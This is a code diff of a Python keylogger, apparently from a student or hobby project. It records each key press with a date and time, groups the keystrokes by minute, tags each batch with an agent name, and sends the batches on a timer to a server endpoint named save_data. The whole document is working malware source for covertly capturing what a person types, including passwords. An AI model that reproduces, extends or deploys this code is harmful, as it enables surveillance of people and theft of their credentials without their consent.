@@ -2,22 +2,23 @@ import keyboard, requests, threading, time                       #Import a libra
 from datetime import datetime            #Import a library that records date and time.
 from Xor_2 import xor_on_key
 
-my_json = []
+temp_presses = []
 url = f"http://127.0.0.1:5000/save_data"
 times = []
 
 def send_data_to_server():
-    status = requests.post(url, json=my_json)
+    global temp_presses, times
+    temp_presses.insert(0, {"name": "Nassralla"}) # adding the specific agent name. 
+    status = requests.post(url, json=temp_presses)
+    temp_presses = []
+    times = []
     return status
 
 def time_stoper(timeout, func):
     def wrapper():
-        global my_json, times
         while True:
             time.sleep(timeout)
             func()
-            my_json = []
-            times = []
     t = threading.Thread(target=wrapper, daemon=True)
     t.start()
 
@@ -50,9 +51,9 @@ def on_key_press(key):
 
     if current_time not in times:
         times.append(current_time)
-        my_json.append({"date": f"{month}/{day}/{year}", "time": f"{hour}:{minute}", "text": key})
+        temp_presses.append({"date": f"{month}/{day}/{year}", "time": f"{hour}:{minute}", "text": key})
     else:
-        my_json[-1]["text"] += key
+        temp_presses[-1]["text"] += key
 
 
 #For checking the current file.
